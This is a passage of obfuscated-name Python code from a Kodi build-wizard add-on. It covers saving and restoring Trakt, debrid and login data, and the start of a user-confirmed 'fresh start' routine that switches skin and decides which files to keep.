				if os .path .exists (OOO00OOO0000O0O0O ):#line:4489
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000000O0000000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4490
					else :os .remove (OOO00OOO0000O0O0O )#line:4491
				shutil .copy (OOO0OOOOOOOO000OO ,OOO00OOO0000O0O0O )#line:4492
			loginit .importlist ('all')#line:4493
			loginit .loginIt ('restore','all')#line:4494
		if os .path .exists (O000O000O0O00O00O ):#line:4495
			O0000OOO000O0O0O0 +=1 #line:4496
			OO0OO0O00O00O0OO0 =os .listdir (O000O000O0O00O00O )#line:4497
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4498
			for O000000O0000000O0 in OO0OO0O00O00O0OO0 :#line:4499
				OOO00OOO0000O0O0O =os .path .join (debridit .REALFOLD ,O000000O0000000O0 )#line:4500
				OOO0OOOOOOOO000OO =os .path .join (O000O000O0O00O00O ,O000000O0000000O0 )#line:4501
				if os .path .exists (OOO00OOO0000O0O0O ):#line:4502
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000000O0000000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4503
					else :os .remove (OOO00OOO0000O0O0O )#line:4504
				shutil .copy (OOO0OOOOOOOO000OO ,OOO00OOO0000O0O0O )#line:4505
			debridit .importlist ('all')#line:4506
			debridit .debridIt ('restore','all')#line:4507
		wiz .cleanHouse (O000OOOOOO0O0O0O0 )#line:4508
		wiz .removeFolder (O000OOOOOO0O0O0O0 )#line:4509
		os .remove (OOO0OOOOO0000OOOO )#line:4510
		if O0000OOO000O0O0O0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4511
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4512
	elif OOO000OOO0O00OOO0 =='export':#line:4513
		O0OO0OO0OO0O0O00O =xbmc .translatePath (MYBUILDS )#line:4514
		OOOO00000000OOO0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4515
		traktit .traktIt ('update','all')#line:4516
		loginit .loginIt ('update','all')#line:4517
		debridit .debridIt ('update','all')#line:4518
		O0OOO0000OO0O0OOO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4519
		O0OOO0000OO0O0OOO =xbmc .translatePath (O0OOO0000OO0O0OOO )#line:4520
		OO00OOOO0OO0OOOO0 =os .path .join (O0OO0OO0OO0O0O00O ,'SaveData.zip')#line:4521
		OO000OOOOO00OOOO0 =zipfile .ZipFile (OO00OOOO0OO0OOOO0 ,mode ='w')#line:4522
		for O00O0000OO00OOOOO in OOOO00000000OOO0O :#line:4523
			if os .path .exists (O00O0000OO00OOOOO ):#line:4524
				OO0OO0O00O00O0OO0 =os .listdir (O00O0000OO00OOOOO )#line:4525
				for OOOO0OO0OOOO000OO in OO0OO0O00O00O0OO0 :#line:4526
					OO000OOOOO00OOOO0 .write (os .path .join (O00O0000OO00OOOOO ,OOOO0OO0OOOO000OO ),os .path .join (O00O0000OO00OOOOO ,OOOO0OO0OOOO000OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4527
		OO000OOOOO00OOOO0 .close ()#line:4528
		if O0OOO0000OO0O0OOO ==O0OO0OO0OO0O0O00O :#line:4529
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOO0OO0OOOO0 ))#line:4530
		else :#line:4531
			try :#line:4532
				xbmcvfs .copy (OO00OOOO0OO0OOOO0 ,os .path .join (O0OOO0000OO0O0OOO ,'SaveData.zip'))#line:4533
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OOO0000OO0O0OOO ,'SaveData.zip')))#line:4534
			except :#line:4535
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOO0OO0OOOO0 ))#line:4536
def freshStart (install =None ,over =False ):#line:4541
	if USERNAME =='':#line:4542
		ADDON .openSettings ()#line:4543
		sys .exit ()#line:4544
	O0OO00OO00000OO0O =u_list (SPEEDFILE )#line:4545
	(O0OO00OO00000OO0O )#line:4546
	O0O0OO0OOO00OO0O0 =(wiz .workingURL (O0OO00OO00000OO0O ))#line:4547
	(O0O0OO0OOO00OO0O0 )#line:4548
	if KEEPTRAKT =='true':#line:4549
		traktit .autoUpdate ('all')#line:4550
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4551
	if KEEPREAL =='true':#line:4552
		debridit .autoUpdate ('all')#line:4553
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4554
	if KEEPLOGIN =='true':#line:4555
		loginit .autoUpdate ('all')#line:4556
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4557
	if over ==True :OOOO00OOO0000OO0O =1 #line:4558
	elif install =='restore':OOOO00OOO0000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4559
	elif install :OOOO00OOO0000OO0O =1 #line:4560
	else :OOOO00OOO0000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4561
	if OOOO00OOO0000OO0O :#line:4562
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4563
			O0OOOOO000OO00000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4564
			skinSwitch .swapSkins (O0OOOOO000OO00000 )#line:4567
			O00OO0O00O00OO0OO =0 #line:4568
			xbmc .sleep (1000 )#line:4569
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO0O00O00OO0OO <150 :#line:4570
				O00OO0O00O00OO0OO +=1 #line:4571
				xbmc .sleep (1000 )#line:4572
				wiz .ebi ('SendAction(Select)')#line:4573
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4574
				wiz .ebi ('SendClick(11)')#line:4575
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4576
			xbmc .sleep (1000 )#line:4577
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4578
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4579
			return #line:4580
		wiz .addonUpdates ('set')#line:4581
		O000OOO0OO0O0O00O =os .path .abspath (HOME )#line:4582
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4583
		OOO0OO00OO00O00OO =sum ([len (OOO0O00OOO0O0O00O )for OOOOO00OO0O00OOOO ,O000O0O0OOOOOOO00 ,OOO0O00OOO0O0O00O in os .walk (O000OOO0OO0O0O00O )]);O0O00OO000O000O0O =0 #line:4584
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4585
		EXCLUDES .append ('My_Builds')#line:4586
		EXCLUDES .append ('archive_cache')#line:4587
		EXCLUDES .append ('script.module.requests')#line:4588
		EXCLUDES .append ('myfav.anon')#line:4589
		if KEEPREPOS =='true':#line:4590
			O0OO0O0O0000O0000 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4591
			for OOOOO000OO00O0OOO in O0OO0O0O0000O0000 :#line:4592
				OO0OOO0OOOOO00OOO =os .path .split (OOOOO000OO00O0OOO [:-1 ])[1 ]#line:4593
				if not OO0OOO0OOOOO00OOO ==EXCLUDES :#line:4594
					EXCLUDES .append (OO0OOO0OOOOO00OOO )#line:4595
		if KEEPSUPER =='true':#line:4596
			EXCLUDES .append ('plugin.program.super.favourites')#line:4597
		if KEEPMOVIELIST =='true':#line:4598
			EXCLUDES .append ('plugin.video.metalliq')#line:4599
		if KEEPMOVIELIST =='true':#line:4600
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4601
		if KEEPADDONS =='true':#line:4602
			EXCLUDES .append ('addons')#line:4603
		if KEEPADDONS =='true':#line:4604
			EXCLUDES .append ('addon_data')#line:4605
		EXCLUDES .append ('plugin.video.elementum')#line:4608
		EXCLUDES .append ('script.elementum.burst')#line:4609
		EXCLUDES .append ('script.elementum.burst-master')#line:4610
		EXCLUDES .append ('plugin.video.quasar')#line:4611
		EXCLUDES .append ('script.quasar.burst')#line:4612
		EXCLUDES .append ('skin.estuary')#line:4613
		if KEEPWHITELIST =='true':#line:4616
			OO0OOOO0OO0OO0O00 =''#line:4617
			OO0O0OO0OO0O0000O =wiz .whiteList ('read')#line:4618
			if len (OO0O0OO0OO0O0000O )>0 :#line:4619
				for OOOOO000OO00O0OOO in OO0O0OO0OO0O0000O :#line:4620
					try :OOOOO0OOOO00OO00O ,OO000OOOOO0O00O0O ,O0OO0O00O00OOOOOO =OOOOO000OO00O0OOO #line:4621
					except :pass #line:4622
					if O0OO0O00O00OOOOOO .startswith ('pvr'):OO0OOOO0OO0OO0O00 =OO000OOOOO0O00O0O #line:4623
					O0OO0OO000O00OOOO =dependsList (O0OO0O00O00OOOOOO )#line:4624
					for OO0O0OOO0O00O0OO0 in O0OO0OO000O00OOOO :#line:4625
						if not OO0O0OOO0O00O0OO0 in EXCLUDES :#line:4626
							EXCLUDES .append (OO0O0OOO0O00O0OO0 )#line:4627
						O0OO0OOOOOO0O0OO0 =dependsList (OO0O0OOO0O00O0OO0 )#line:4628
						for OOO0OO0000O000OO0 in O0OO0OOOOOO0O0OO0 :#line:4629
							if not OOO0OO0000O000OO0 in EXCLUDES :#line:4630
								EXCLUDES .append (OOO0OO0000O000OO0 )#line:4631
					if not O0OO0O00O00OOOOOO in EXCLUDES :#line:4632
						EXCLUDES .append (O0OO0O00O00OOOOOO )#line:4633
				if not OO0OOOO0OO0OO0O00 =='':wiz .setS ('pvrclient',O0OO0O00O00OOOOOO )#line:4634
		if wiz .getS ('pvrclient')=='':#line:4635
			for OOOOO000OO00O0OOO in EXCLUDES :#line:4636
				if OOOOO000OO00O0OOO .startswith ('pvr'):#line:4637
					wiz .setS ('pvrclient',OOOOO000OO00O0OOO )#line:4638
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4639
		O0OOOOO0O000O0O00 =wiz .latestDB ('Addons')#line:4640
		for O00OO00000O0O0O0O ,O00OO0OO0OO0000OO ,OO0O0O0000O0O00O0 in os .walk (O000OOO0OO0O0O00O ,topdown =True ):#line:4641
			O00OO0OO0OO0000OO [:]=[OOO0O0O00O0O0000O for OOO0O0O00O0O0000O in O00OO0OO0OO0000OO if OOO0O0O00O0O0000O not in EXCLUDES ]#line:4642
			for OOOOO0OOOO00OO00O in OO0O0O0000O0O00O0 :#line:4643
				O0O00OO000O000O0O +=1 #line:4644
				O0OO0O00O00OOOOOO =O00OO00000O0O0O0O .replace ('/','\\').split ('\\')#line:4645
				O00OO0O00O00OO0OO =len (O0OO0O00O00OOOOOO )-1 #line:4647
				if O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4648
				elif OOOOO0OOOO00OO00O =='MyVideos99.db'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4649
				elif OOOOO0OOOO00OO00O =='MyVideos107.db'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4650
				elif OOOOO0OOOO00OO00O =='MyVideos116.db'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4651
				elif OOOOO0OOOO00OO00O =='MyVideos99.db'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4652
				elif OOOOO0OOOO00OO00O =='MyVideos107.db'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4653
				elif OOOOO0OOOO00OO00O =='MyVideos116.db'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4654
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4655
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'skin.anonymous.mod'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4656
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'skin.Premium.mod'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4657
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'skin.anonymous.nox'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4658
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'skin.phenomenal'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4659
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.metalliq'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4660
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'skin.titan'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4662
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'pvr.iptvsimple'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4663
				elif OOOOO0OOOO00OO00O =='sources.xml'and O0OO0O00O00OOOOOO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4665
				elif OOOOO0OOOO00OO00O =='quicknav.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4668
				elif OOOOO0OOOO00OO00O =='x1101.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4669
				elif OOOOO0OOOO00OO00O =='b-srtym-b.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4670
				elif OOOOO0OOOO00OO00O =='x1102.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4671
				elif OOOOO0OOOO00OO00O =='b-sdrvt-b.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4672
				elif OOOOO0OOOO00OO00O =='x1112.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4673
				elif OOOOO0OOOO00OO00O =='b-tlvvyzyh-b.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4674
				elif OOOOO0OOOO00OO00O =='x1111.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4675
				elif OOOOO0OOOO00OO00O =='b-tvknyshrly-b.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4676
				elif OOOOO0OOOO00OO00O =='x1110.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4677
				elif OOOOO0OOOO00OO00O =='b-yldym-b.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4678
				elif OOOOO0OOOO00OO00O =='x1114.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4679
				elif OOOOO0OOOO00OO00O =='b-mvzyqh-b.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4680
				elif OOOOO0OOOO00OO00O =='mainmenu.DATA.xml'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4681
				elif OOOOO0OOOO00OO00O =='skin.Premium.mod.properties'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4682
				elif OOOOO0OOOO00OO00O =='favourites.xml'and O0OO0O00O00OOOOOO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4686
				elif OOOOO0OOOO00OO00O =='guisettings.xml'and O0OO0O00O00OOOOOO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4688
				elif OOOOO0OOOO00OO00O =='profiles.xml'and O0OO0O00O00OOOOOO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4689
				elif OOOOO0OOOO00OO00O =='advancedsettings.xml'and O0OO0O00O00OOOOOO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4690
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4691
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'program.apollo'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4692
				elif O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -2 ]=='userdata'and O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0OO0O00O00OOOOOO [O00OO0O00O00OO0OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO00000O0O0O0O ,OOOOO0OOOO00OO00O ),xbmc .LOGNOTICE )#line:4693
